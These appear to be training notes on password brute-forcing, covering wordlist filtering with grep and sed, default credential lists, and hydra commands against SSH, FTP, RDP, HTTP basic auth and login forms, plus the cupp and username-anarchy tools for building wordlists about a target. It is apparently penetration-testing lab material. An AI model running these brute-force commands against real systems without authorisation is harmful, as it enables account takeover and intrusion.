

A Brute Force attack is a method of attempting to guess passwords or keys by automated probing. 


# Offline Bruteforce
Since the password cannot be calculated backward from the hash value, the brute force method determines the hash values belonging to the randomly selected passwords until a hash value matches the stored hash value. In this case, the password is found. This method is also called offline brute-forcing. This module will focus on online brute-forcing and explicitly deal with the websites' login forms.


# Some Tools

There are many tools and methods to utilize for login brute-forcing, like:

- Ncrack
- wfuzz
- medusa
- patator
- hydra
- and others.



# Compliance with Password Policy


#### Password length

Keep only the words longer than 8 characters

```$ grep -E "^.{8,}$" old_passwords.txt > new_passwors.txt```

#### Include uppercase ,lowercase,numerical characters

```$ grep -E [A-Z] old_pass.txt > new_pass.txt```
```$ grep -E [a-z] old_pass.txt > new_pass.txt```
```$ grep -E [0-9] old_pass.txt > new_pass.txt```

```$ grep -E '([!@#$%^&*].*){2,}' old_pass.txt > new_pass.txt```

```

        $ sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
        
        $ sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
        
        $ sed -ri '/[0-9]+/!d' william.txt            # remove no numbers

```



        
# Default Credentials


We can find a list of default password login pairs in the SecLists repository as well, specifically in the /SecLists/Passwords/Default-Credentials 

|Options 	     |      Description|
|----------------|----------------|
        -C  ftp-betterdefaultpasslist.txt 	|Combined Credentials Wordlist
        SERVER_IP 	 |   Target IP
        -s PORT 	 |   Target Port
        http-get 	 |   Request Method
        / 	       |     Target Path

```$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /```



# Brute Forcing Hydra Forms
    
### Examples 

```$ hydra -l username -P passwords.txt  ssh://123.122.121.120 -s 2222```

```$ hydra -l ftpuser -P passwords.txt  ftp://123.122.121.120 -t 100  -v ```

```$ hydra -l admin -P passwords.txt http://172.168.2.1:80 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"```

####  password length (6 to 8) rdp bruteforce
```$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp```

#### http basic auth

```$ hydra -l user -P passwords.txt 127.0.0.1 http-get / -s 80```
    
- http[s]-{head|get|post}
- http[s]-post-form

The 1st module serves for basic HTTP authentication, while the 2nd module is used for login forms, like .php or .aspx and others.

To decide which module we need, we have to determine whether the web application uses GET or a POST form. 

Based on the URL scheme at the beginning, we can determine whether this is an HTTP or HTTPS post-form. If our target URL shows http, in this case, we should use the http-post-form module.

To find out how to use the http-post-form module, we can use the "-U" flag to list the parameters it requires and examples of usage:
```$ hydra http-post-form -U```

In summary, we need to provide three parameters, separated by :, as follows:

- URL path, which holds the login form
    
- POST parameters for username/password
    
- A failed/success login string, which lets hydra recognize whether the login attempt was successful or not

```
/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:[FAIL/SUCCESS]=[success/failed string]
```

|Type 	|Boolean Value 	    |  Flag|
|----------|-----------|-------|
Fail 	  |  FALSE 	      |   F=html_content
Success 	|TRUE 	      |   S=html_content



## Determine Login Parameters


- Using Browser

One of the easiest ways to capture a form's parameters is through using a browser's built in developer tools. For example, we can open firefox within PwnBox, and then bring up the Network Tools 

 Once we have the request, we can simply right-click on one of them, and select Copy > Copy POST data

## Using Burp Suite

        
        
```$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"```





# Personalized Wordlists

## Username Anarchy

```
$ sudo apt install ruby -y
$ git clone https://github.com/urbanadventurer/username-anarchy.git
$ cd username-anarchy
$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
```
## CUPP

(   https://github.com/Mebus/cupp     )


Many tools can create a custom password wordlist based on certain information. The tool we will be using is cupp, which is pre-installed in your PwnBox. If we are doing the exercise from our own VM, we can install it with sudo apt install cupp or clone it from the Github repository. Cupp is very easy to use. We run it in interactive mode by specifying the -i argument, and answer the questions, as follows:

```$ cupp -i```



